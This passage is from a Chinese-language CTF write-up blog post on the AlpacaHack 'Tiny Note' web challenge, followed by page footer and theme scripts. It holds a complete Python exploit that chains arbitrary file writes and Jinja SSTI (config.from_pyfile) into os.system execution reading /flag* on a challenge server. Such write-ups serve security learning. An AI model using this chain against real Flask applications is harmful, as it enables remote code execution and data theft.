+<p>目標是執行到 &#x2F;app&#x2F;b<br>用 SSTI 執行他可以使用 <code>&#123;&#123;config.from_pyfile("b")&#125;&#125;</code><br>但太長了，所以稍微利用一下它可以傳入 title</p>
+<p>就可以使用 <code>&#123;&#123;config[content]("b")&#125;&#125;</code> (這個寫入 &#x2F;app&#x2F;templates&#x2F;note.html)</p>
+<p>之後先創建一個 note<br>title 是 tomorin<br>content 是 from_pyfile</p>
+<p>之後把 index.html 改寫成 <code>&#123;%include "f"%&#125;</code><br>最後去打開 tomorin 來 trigger SSTI</p>
+<p>PS: 這邊需要先注意一件事，不要打開網站，直接跑腳本，我猜原因是 index.html 會被 cache 起來，導致就算我們改寫了 index.html 也沒有 trigger 到開啟 flag</p>
+<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req_nr</span>(<span class="params">chal_url, title, content</span>):</span><br><span class="line">    <span class="keyword">return</span> requests.post(<span class="string">f&#x27;<span class="subst">&#123;chal_url&#125;</span>/new&#x27;</span>,data=&#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: title,</span><br><span class="line">	    <span class="string">&#x27;content&#x27;</span>: content</span><br><span class="line">    &#125;, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req_get</span>(<span class="params">req_url</span>):</span><br><span class="line">    <span class="keyword">return</span> requests.get(req_url).status_code</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://34.170.146.252:33716&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">req_nr(url, <span class="string">&quot;/app/templates/note.html&quot;</span>, <span class="string">&#x27;&#123;&#123;config[content](&quot;b&quot;)&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">req_nr(url, <span class="string">&quot;/app/a.py&quot;</span>, <span class="string">&quot;import os;r=os.system&quot;</span>)</span><br><span class="line">req_nr(url, <span class="string">&quot;/sc&quot;</span>, <span class="string">&#x27;cat /flag* &gt; templates/f&#x27;</span>)</span><br><span class="line">req_nr(url, <span class="string">&quot;/app/b&quot;</span>, <span class="string">&#x27;import a;a.r(&quot;sh /sc&quot;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tomorin_uuid = req_nr(url, <span class="string">&quot;tomorin&quot;</span>, <span class="string">&quot;from_pyfile&quot;</span>)</span><br><span class="line">uuid = tomorin_uuid.headers[<span class="string">&#x27;Location&#x27;</span>].split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Your note UUID :&quot;</span>, uuid)</span><br><span class="line"></span><br><span class="line">req_nr(url,<span class="string">&quot;/app/templates/index.html&quot;</span> , <span class="string">&#x27;&#123;%include &quot;f&quot;%&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">status = req_get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/<span class="subst">&#123;uuid&#125;</span>/tomorin&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Trigger status code: &quot;</span>, status)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag : &quot;</span>, requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>&quot;</span>+<span class="string">&quot;/&quot;</span>).text)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Flag: Alpaca{I_kn0w_that_cache_is_d4ngerou5_in_CTF}</p>
+</blockquote>
+<h2 id="after-all"><a href="#after-all" class="headerlink" title="after all"></a>after all</h2><p>XSS 真的好難，躺</p>
+<img src="/2025/05/30/alpacahack-round-11-web-writeup/upload_30d756bbf9e3af09efff642a389de548.png" class="">
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/posts_cover/os-arch/126727093_p0_master1200.jpg" data-sizes="auto" alt="Page Fault handle on userspace - Userfaultfd" class="lazyload">
+      
+      <a href="/2025/05/22/page-fault-handle-on-userspace-userfaultfd/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          Page Fault handle on userspace - Userfaultfd
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      Naup堇姬
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        177.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        15:33
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#alpacahack-round-11-web-Jackpot-Tiny-Note"><span class="toc-number">1.</span> <span class="toc-text">alpacahack round 11 web - Jackpot &amp; Tiny Note</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jackpot"><span class="toc-number">1.2.</span> <span class="toc-text">Jackpot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tiny-Note"><span class="toc-number">1.3.</span> <span class="toc-text">Tiny Note</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#source-code"><span class="toc-number">1.3.1.</span> <span class="toc-text">source code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bug"><span class="toc-number">1.3.2.</span> <span class="toc-text">bug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-number">1.3.3.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after-all"><span class="toc-number">1.4.</span> <span class="toc-text">after all</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">71</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Naup堇姬",
+          title: "alpacahack round 11 web - Jackpot &amp; Tiny Note",
+          url: "http://example.com/2025/05/30/alpacahack-round-11-web-writeup/",
+          excerpt: "",
+          description: "",
+          stripContent: "alpacahack round 11 web - Jackpot &amp;amp; Tiny Note Author : 堇姬 Naup  前言那天在忙，只打了第一題，這篇順便補另外一題 (窩不會 XSS) Jackpot12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from flask import Flask, request, ",
+          date: "Fri May 30 2025 09:07:57 GMT+0800",
+          updated: "Fri May 30 2025 09:11:16 GMT+0800",
+          cover: "https://i.imgur.com/OjUqWVO.jpeg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
